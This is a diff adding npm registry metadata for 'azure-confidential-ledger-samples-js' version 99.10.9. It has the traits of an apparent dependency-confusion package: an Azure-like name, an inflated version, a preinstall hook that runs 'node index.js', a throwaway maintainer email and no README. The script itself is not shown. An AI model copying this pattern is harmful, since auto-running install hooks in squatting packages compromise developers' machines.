@@ -1,0 +1,62 @@
+{
+    "_id": "azure-confidential-ledger-samples-js",
+    "name": "azure-confidential-ledger-samples-js",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-confidential-ledger-samples-js",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-confidential-ledger-samples-js@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-eVA3cTLBKrnfJ+zZCnMN5hG39mGeQ2ClwfxPiHduMnuNFXayQrDQ1T0QyU5cc5+pBnoalRe3FFE3Q8JluSe0Ag==",
+                "shasum": "0e537f4bcfac1da3600d750ee526d005b3f15490",
+                "tarball": "https://registry.npmjs.org/azure-confidential-ledger-samples-js/-/azure-confidential-ledger-samples-js-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5088,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOoWhACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoP+Q//cklk9x3JUebm1o+Z3B0ReW+q0eM2CleQUvG8lM0Sjl0E13u6\r\nNXQHVIUCRPpjTWHqIxtpfrcS3SvKjyIi2fPwk8ZLRxWlq/sdTKEbiKDZcYIn\r\nfgHxSJGnLLgVJtMc8XbFaivyoIxDx74s8wEFXxi7mYSuBI82ECSfBxga40Ph\r\nFN3eZgCtJVwBqtopwOcSGDWNgK8EgpkJ355lJ9RkzhBs5JZAzTCFJJiv2ltx\r\n7tX93uvUT2T4hbeSWsR2PxAFSHpM85cKt1+vXQb7MbBRiY0KUhkPjRvUL1wS\r\nOUPHO+TkyV9lfdPowIhFeR4D0O38orF7JBEhbhdd5Cb3T46A/6l5lS7eciXe\r\ngmxP6TBd7F6ohejinK2qb9tDf3zEWtEKUOFH16mqiiOrZu3QwT/hoEoaq8/f\r\nkjK201/B/AbJJYQWmlNlaCy4bnpdtUNrK7UG4766eTZBfrih0WFcsrc4ODwC\r\nfpmcqXSTMvcZrsEOkrCPPcve/28q7o30opKpI850r5jKObM/fvWLKDlmP/hD\r\nuP1DrbD4Yb4rhqqVO95eJh7xiBTZ1PC59ETJWuOC5smHfJ1/gVMygkk/A2QO\r\nzCMsjrayDIm65p+eQ9eOlqDfRF+0JRG0D8jTq7g0Ux9/Y0dMCTAp9+NHrb3h\r\nfCueJar87uesthuvTRGjcBT1VU/4qKQsDJI=\r\n=u66x\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "yrmvqpih",
+                "email": "yrmvqpih@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "yrmvqpih",
+                    "email": "yrmvqpih@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-confidential-ledger-samples-js_99.10.9_1648002465002_0.217967499147528"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T02:27:45.001Z",
+        "99.10.9": "2022-03-23T02:27:45.369Z",
+        "modified": "2022-03-23T02:27:45.487Z"
+    },
+    "maintainers": [
+        {
+            "name": "yrmvqpih",
+            "email": "yrmvqpih@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
